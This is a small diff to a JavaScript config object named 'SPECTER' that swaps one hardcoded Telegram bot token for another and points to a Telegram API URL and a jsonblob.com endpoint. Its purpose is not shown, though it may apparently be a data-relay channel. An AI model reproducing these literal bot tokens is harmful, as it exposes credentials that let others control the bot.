@@ -1,6 +1,6 @@
 window.SPECTER = {
-  BOT_TOKEN: '8841794082:AAFaR6k15CsoC_CcQ7qCAyfrF4yw8YhXCD4',
-  TG_API:    'https://api.telegram.org/bot8841794082:AAFaR6k15CsoC_CcQ7qCAyfrF4yw8YhXCD4',
+  BOT_TOKEN: '8678455660:AAE16-b_nNGR8dY7WPdW0o1faSFf20jJvvY',
+  TG_API:    'https://api.telegram.org/bot8678455660:AAE16-b_nNGR8dY7WPdW0o1faSFf20jJvvY',
 
   BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',
 
